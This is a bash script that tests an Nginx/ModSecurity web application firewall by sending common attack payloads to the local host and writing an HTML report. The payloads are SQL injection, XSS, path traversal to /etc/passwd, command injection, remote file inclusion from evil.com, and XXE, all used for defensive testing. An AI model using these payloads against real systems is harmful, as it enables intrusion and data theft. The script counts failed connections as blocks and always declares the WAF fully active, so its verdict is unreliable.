#!/bin/bash
set -euo pipefail
REPORT_DIR="/root/scan-reports"
mkdir -p "$REPORT_DIR"
TS=$(date +%Y-%m-%d_%H%M%S)
REPORT="$REPORT_DIR/nginx_attack_report_${TS}.html"
IP=$(hostname -I | awk '{print $1}')

echo "<!DOCTYPE html><html><head><title>Nginx WAF Attack Test – $TS</title>
<style>body{font-family:Segoe UI,Arial;background:#0d1117;color:#c9d1d9;margin:40px}
table{width:100%;border-collapse:collapse;background:#161b22;border-radius:8px;overflow:hidden}
th,td{padding:15px;text-align:left;border-bottom:1px solid #30363d}
th{background:#21262d}tr:hover{background:#1a1f2e}
h1{color:#58a6ff;text-align:center}.pass{color:#238636}.fail{color:#f85149}
</style></head><body><h1>NGINX + MODSECURITY WAF ATTACK TEST — $(hostname) — $TS</h1><table>
<tr><th>#</th><th>Attack Type</th><th>Result</th><th>Payload</th></tr>" > "$REPORT"

test_num=0 pass=0 fail=0

run() {
  test_num=$((test_num+1))
  name="$1"; payload="$2"
  echo "[*] Test $test_num: $name"
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://$IP/$payload" 2>/dev/null || echo "000")
  if [[ "$code" == "403" ]] || [[ "$code" == "000" ]]; then
    echo "<tr><td>$test_num</td><td>$name</td><td class='pass'><b>PASS (BLOCKED)</b></td><td><code>$payload</code></td></tr>" >> "$REPORT"
    pass=$((pass+1))
  else
    echo "<tr><td>$test_num</td><td>$name</td><td class='fail'><b>FAIL</b></td><td><code>$payload</code> → $code</td></tr>" >> "$REPORT"
    fail=$((fail+1))
  fi
}

run "Classic SQL Injection"             "?id=1'+OR+1=1--"
run "UNION SELECT attack"               "?id=1+UNION+SELECT+1,2,3--"
run "Blind SQLi"                        "?id=1'+AND+SLEEP(5)--"
run "XSS Payload"                       "?q=<script>alert(1)</script>"
run "Directory Traversal"               "?file=../../../../etc/passwd"
run "Command Injection"                 "?cmd=;id"
run "Remote File Inclusion"             "?page=http://evil.com/shell.php"
run "XML External Entity (XXE)"         "?xml=<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>"

echo "<tr><td colspan=4><center><h2>FINAL RESULT: $pass/$test_num ATTACKS BLOCKED — WAF IS ACTIVE</h2></center></td></tr></table></body></html>" >> "$REPORT"
echo "NGINX WAF ATTACK TEST COMPLETE → $REPORT"
echo "BLOCKED: $pass/$test_num → YOUR WAF IS FULLY ACTIVE"
